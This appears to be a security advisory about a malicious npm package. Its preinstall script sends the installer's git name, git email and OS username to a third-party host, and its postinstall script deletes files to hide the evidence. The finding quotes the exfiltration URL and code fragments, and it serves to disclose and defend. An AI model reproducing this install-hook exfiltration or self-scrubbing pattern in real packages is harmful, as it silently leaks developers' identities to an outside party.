summary: preinstall script exfiltrates installer git identity and OS username to third-party host; postinstall self-scrubs evidence
details: At `npm install` time, `dist/scripts/preinstall.js` reads the installer's `~/.gitconfig` (via `iniparser.parseSync(home_dir+'/.gitconfig')`) and OS username (`os.userInfo().username`), then issues an `https.get` to `https://2tak.l.serverhost.name:1962/mobile/reext?osname=...&gitname=...&gitemail=...`. The destination is not on the package's declared publisher domain and the data flow is silent (no README disclosure, no opt-in, no env-var gate). Every developer or CI machine that installs the package will leak the real-name/email identity configured in git plus the OS login name to an attacker-controlled third-party endpoint. Corroborating intent: `dist/scripts/postinstall.js` then rewrites the installed `package.json` to delete the `scripts`, `devDependencies`, `dependencies`, and `eslintConfig` fields and `fs.rmSync`es `./dist/scripts`, `./dist/data`, `./dist/resources`, `./dist/source`, scrubbing the evidence of what ran at install from the on-disk node_modules copy. Anti-forensic self-deletion is not consistent with benign telemetry.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
